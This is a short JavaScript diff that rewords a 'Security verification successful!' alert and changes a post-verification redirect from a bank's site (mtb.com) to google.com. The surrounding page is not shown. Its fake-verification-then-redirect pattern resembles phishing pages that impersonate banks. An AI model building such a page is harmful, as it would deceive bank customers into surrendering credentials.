@@ -70,11 +70,11 @@ document.addEventListener('DOMContentLoaded', function() {
                 }
                 
                 // Show success message for 1 second
-                alert('Security verification successful!');
+                alert('Success');
                 
                 // Redirect to mtb.com after 1 second
                 setTimeout(function() {
-                    window.location.href = 'https://www.mtb.com';
+                    window.location.href = 'https://www.google.com';
                 }, 1000);
             } catch (error) {
                 console.error('Security verification error:', error);
